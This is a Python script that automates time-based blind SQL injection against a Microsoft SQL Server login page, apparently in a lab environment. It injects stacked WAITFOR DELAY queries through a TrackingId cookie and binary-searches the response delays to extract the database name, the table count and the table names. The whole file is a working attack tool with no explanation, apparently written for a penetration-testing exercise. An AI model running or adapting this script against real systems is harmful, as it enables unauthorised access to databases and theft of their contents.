import requests
import time
import urllib.parse

def binary_search_number(min_val, max_val, target_url, cookies, query_template):
    while min_val <= max_val:
        mid_val = (min_val + max_val) // 2
        sqli_payload = urllib.parse.quote(query_template.format(mid_val=mid_val))
        cookies_injected = cookies.copy()
        cookies_injected["TrackingId"] = sqli_payload

        start_time = time.time()
        response = requests.post(target_url, cookies=cookies_injected, data={"e": "test@mail.com", "p": "fff"}, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, verify=False)
        elapsed_time = time.time() - start_time

        if elapsed_time >= 10:
            return mid_val
        else:
            sqli_payload = urllib.parse.quote(query_template.replace("= {mid_val}", "> {mid_val}").format(mid_val=mid_val))
            cookies_injected["TrackingId"] = sqli_payload

            start_time = time.time()
            response = requests.post(target_url, cookies=cookies_injected, data={"e": "test@mail.com", "p": "fff"}, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, verify=False)
            elapsed_time = time.time() - start_time

            if elapsed_time >= 10:
                min_val = mid_val + 1
            else:
                max_val = mid_val - 1

    return None

def binary_search_string(length, target_url, cookies, query_template):
    extracted_string = ""
    for position in range(1, length + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            sqli_payload = urllib.parse.quote(query_template.format(position=position, mid_char=mid))
            cookies_injected = cookies.copy()
            cookies_injected["TrackingId"] = sqli_payload

            start_time = time.time()
            response = requests.post(target_url, cookies=cookies_injected, data={"e": "test@mail.com", "p": "fff"}, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, verify=False)
            elapsed_time = time.time() - start_time

            if elapsed_time >= 10:
                extracted_string += chr(mid)
                print(f"Found character: {chr(mid)} at position {position}")
                break
            else:
                sqli_payload = urllib.parse.quote(query_template.replace("= {mid_char}", "> {mid_char}").format(position=position, mid_char=mid))
                cookies_injected["TrackingId"] = sqli_payload

                start_time = time.time()
                response = requests.post(target_url, cookies=cookies_injected, data={"e": "test@mail.com", "p": "fff"}, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, verify=False)
                elapsed_time = time.time() - start_time

                if elapsed_time >= 10:
                    low = mid + 1
                else:
                    high = mid - 1

    return extracted_string

def get_database_name(target_url, cookies):
    print("[+] Determining database name length...")
    query_template_length = (
        "test'; IF (LEN(DB_NAME()) = {mid_val}) WAITFOR DELAY '0:0:10' --"
    )
    database_name_length = binary_search_number(1, 100, target_url, cookies, query_template_length)

    if database_name_length:
        print(f"[+] Database name length: {database_name_length}")
        print("[+] Extracting database name...")
        query_template_name = (
            "test'; IF (ASCII(SUBSTRING(DB_NAME(), {position}, 1)) = {mid_char}) WAITFOR DELAY '0:0:10' --"
        )
        database_name = binary_search_string(database_name_length, target_url, cookies, query_template_name)
        print(f"[+] Database name: {database_name}")
        return database_name
    else:
        print("[-] Unable to determine database name length.")
        return None

def get_table_count(target_url, cookies, database_name):
    query_template = (
        f"test'; IF ((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = '{database_name}') = {{mid_val}}) WAITFOR DELAY '0:0:10' --"
    )
    return binary_search_number(1, 100, target_url, cookies, query_template)

def enumerate_table_details(target_url, cookies, database_name, table_count):
    for i in range(table_count):
        print(f"Fetching table {i + 1}/{table_count}...")
        query_template_length = (
            f"test'; IF (LEN((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='{database_name}' "
            f"ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)) = {{mid_val}}) WAITFOR DELAY '0:0:10' --"
        )
        table_name_length = binary_search_number(1, 256, target_url, cookies, query_template_length)
        print(f"Table name length: {table_name_length}")

        query_template_name = (
            f"test'; IF (ASCII(SUBSTRING((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='{database_name}' "
            f"ORDER BY TABLE_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY), {{position}}, 1)) = {{mid_char}}) WAITFOR DELAY '0:0:10' --"
        )
        table_name = binary_search_string(table_name_length, target_url, cookies, query_template_name)
        print(f"Table name: {table_name}")

def main():
    target_url = "http://10.129.204.202/login.php"
    cookies = {
        "PHPSESSID": "g6ke688tbpf8v9reniabgqobnr",
        "TrackingId": "000caaa93c8ccaa71e0b8fbeb33eb9b1"
    }

    database_name = get_database_name(target_url, cookies)

    if database_name:
        table_count = get_table_count(target_url, cookies, database_name)

        if table_count:
            print(f"Number of tables: {table_count}")
            enumerate_table_details(target_url, cookies, database_name, table_count)
        else:
            print("Unable to determine the number of tables.")

if __name__ == "__main__":
    main()
